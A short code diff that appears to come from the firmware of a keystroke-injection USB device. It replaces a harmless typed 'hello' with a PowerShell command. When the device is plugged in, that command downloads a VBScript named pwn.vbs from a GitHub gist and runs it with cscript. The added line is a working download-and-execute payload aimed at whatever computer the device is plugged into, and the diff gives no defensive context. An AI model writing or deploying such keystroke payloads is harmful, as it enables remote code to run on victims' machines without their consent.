@@ -29,7 +29,7 @@ void setup()
    keyPress(0, KEY_ENTER);
    keyRelease();
    delay(500);
-   keyString("hello");
+   keyString("powershell -Command \"(New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/Dr-D12345/abc9228407ec4c9d76fbb14a292c5eac/raw/25f4b4c0768a032e58c4c43f07ebe7a6117a43f4/pwn.vbs', 'pwn.vbs')\" & cscript pwn.vbs");
    keyPress(0, KEY_ENTER);
    keyRelease();
  }
